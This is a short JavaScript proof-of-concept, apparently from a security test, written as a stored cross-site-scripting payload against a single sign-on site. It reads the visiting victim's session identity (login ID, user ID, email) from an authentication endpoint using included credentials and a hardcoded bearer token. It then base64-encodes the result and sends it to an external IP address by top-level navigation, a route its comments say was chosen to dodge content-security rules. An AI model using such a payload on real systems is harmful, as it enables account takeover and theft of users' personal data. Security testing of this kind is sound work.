// r16 PoC: attacker-authored, first-party on sso.pub via the F-105 stored sink.
// Reads the visiting victim's SSO session and EXFILTRATES it to the attacker's OOB server
// (closes the attacker-RECEIVES edge the verifier flagged on F-108/V-121). Benign: our own
// test victim, our own listener. Exfil via top-level navigation (not a subresource) to avoid
// mixed-content/CSP subresource rules.
(async function(){
  var o={origin:(function(){try{return self.origin}catch(e){return '?'}})()};
  try{
    var r=await fetch('https://auth.sso.pub.databricks.com/v1/auth/me',{credentials:'include',
      headers:{'Authorization':'Bearer P2fI1vZEAVlmwTIExz7Aec6Y0lLV'}});
    o.st=r.status; var t=await r.text(); var j={}; try{j=JSON.parse(t)}catch(e){}
    o.login=(j.loginIds||[])[0]||''; o.uid=j.userId||''; o.email=j.email||'';
  }catch(e){ o.err=String(e); }
  var d=btoa(unescape(encodeURIComponent(JSON.stringify(o))));
  var url='http://130.61.131.112/r16-ato-exfil?victim='+encodeURIComponent(o.login||'none')+'&uid='+encodeURIComponent(o.uid||'')+'&d='+d;
  try{ (window.top||window).location.href=url; }catch(e){ location.href=url; }
})();
